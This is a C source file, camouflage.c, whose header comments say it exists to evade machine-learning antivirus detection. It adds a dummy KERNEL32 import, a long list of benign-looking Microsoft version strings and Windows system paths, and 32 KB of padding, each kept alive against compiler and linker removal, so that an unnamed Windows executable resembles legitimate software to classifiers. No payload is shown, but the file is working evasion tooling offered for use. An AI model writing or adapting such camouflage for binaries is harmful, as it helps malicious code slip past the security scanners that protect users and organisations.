/*
 * camouflage.c — V3/V4: PE structure camouflage for AV ML evasion
 * V3: dummy kernel32 import. V4: benign strings + padding.
 */
#include <windows.h>
#include <stdint.h>

/* V3: forces KERNEL32.dll into the IAT of the nocrt build. */
__attribute__((dllimport)) extern LPSTR WINAPI GetCommandLineA(void);
static volatile FARPROC g_dummy_import = (FARPROC)(void*)GetCommandLineA;

/* V4: benign metadata strings + padding. */
static const char g_meta[] =
    "6.1.7601.24545\0" "Windows\0" "Microsoft Corporation\0"
    "Operating System\0" "Service Pack 1\0"
    "Built with MSVC 19.39\0" "Windows Runtime Component\0"
    "System Configuration Service\0"
    "C:\\Windows\\explorer.exe\0" "C:\\Windows\\System32\\svchost.exe\0"
    "C:\\Windows\\System32\\lsass.exe\0" "C:\\Windows\\System32\\csrss.exe\0"
    "C:\\Windows\\System32\\winlogon.exe\0" "C:\\Windows\\System32\\smss.exe\0"
    "C:\\Windows\\System32\\RuntimeBroker.exe\0"
    "C:\\Windows\\System32\\notepad.exe\0" "C:\\Windows\\System32\\calc.exe\0"
    "C:\\Windows\\System32\\cmd.exe\0" "C:\\Windows\\System32\\powershell.exe\0"
    "C:\\Windows\\System32\\taskmgr.exe\0" "C:\\Windows\\System32\\regedit.exe\0"
    "C:\\Windows\\System32\\rundll32.exe\0" "C:\\Windows\\System32\\msiexec.exe\0"
    "C:\\Windows\\System32\\wscript.exe\0" "C:\\Windows\\System32\\diskpart.exe\0"
    "C:\\Windows\\System32\\netsh.exe\0" "C:\\Windows\\System32\\sc.exe\0"
    "C:\\Users\\Public\\Documents\0" "C:\\Users\\Public\\Desktop\0"
    "C:\\Windows\\Temp\0" "C:\\Windows\\Prefetch\0"
    "C:\\Windows\\WinSxS\0" "C:\\Windows\\assembly\0"
    "C:\\Windows\\System32\\drivers\0" "C:\\Windows\\System32\\Tasks\0"
    "C:\\Windows\\System32\\bcdedit.exe\0" "C:\\Windows\\System32\\shutdown.exe\0"
    "C:\\Windows\\System32\\whoami.exe\0" "C:\\Windows\\System32\\systeminfo.exe\0"
    "C:\\Windows\\System32\\ipconfig.exe\0" "C:\\Windows\\System32\\ping.exe\0"
    "C:\\Windows\\System32\\netstat.exe\0" "C:\\Windows\\System32\\nslookup.exe\0"
    "C:\\Windows\\System32\\tracert.exe\0" "C:\\Windows\\System32\\route.exe\0"
    "C:\\Windows\\System32\\ftp.exe\0" "C:\\Windows\\System32\\curl.exe\0"
    "C:\\Windows\\System32\\robocopy.exe\0" "C:\\Windows\\System32\\xcopy.exe\0"
    "C:\\Windows\\System32\\attrib.exe\0" "C:\\Windows\\System32\\icacls.exe\0"
    "C:\\Windows\\System32\\devmgmt.msc\0" "C:\\Windows\\System32\\services.msc\0"
    "C:\\Windows\\System32\\eventvwr.msc\0" "C:\\Windows\\System32\\gpedit.msc\0"
    "C:\\Windows\\System32\\certmgr.msc\0" "C:\\Windows\\System32\\dcomcnfg.exe\0"
    "C:\\Windows\\System32\\wbem\\wmic.exe\0" "C:\\Windows\\System32\\esentutl.exe\0"
    "C:\\Windows\\assembly\\GAC_MSIL\0"
    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe\0"
    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\0"
    "C:\\Windows\\System32\\bash.exe\0" "C:\\Windows\\System32\\wsl.exe\0"
    "C:\\Windows\\System32\\signtool.exe\0" "C:\\Windows\\System32\\certutil.exe\0"
    "C:\\Windows\\System32\\SearchProtocolHost.exe\0"
    "C:\\Windows\\System32\\backgroundTaskHost.exe\0"
    "C:\\Windows\\System32\\UserAccountControlSettings.exe\0"
    "C:\\Windows\\System32\\SystemPropertiesPerformance.exe\0"
    "C:\\Windows\\System32\\SystemPropertiesAdvanced.exe\0"
    "C:\\Windows\\System32\\MobilityCenter.exe\0"
    "C:\\Windows\\System32\\displaySwitch.exe\0"
    "C:\\Windows\\System32\\SLUI.exe\0" "C:\\Windows\\System32\\sppsvc.exe\0"
;
/* V4: large padding block to bring the binary to ~60+ KB.
 * __attribute__((used)) tells the compiler to emit it; the volatile reference
 * below prevents the linker's --gc-sections from discarding it. */
__attribute__((used)) static const uint8_t g_pad[32768] = { 0 };

/* Volatile references to prevent optimization. */
static const volatile char *g_meta_ref = g_meta;
static const volatile uint8_t *g_pad_ref = g_pad;

/* Force the linker to keep g_pad by having a non-static function reference it. */
void *camouflage_get_pad(void) { return (void*)g_pad; }
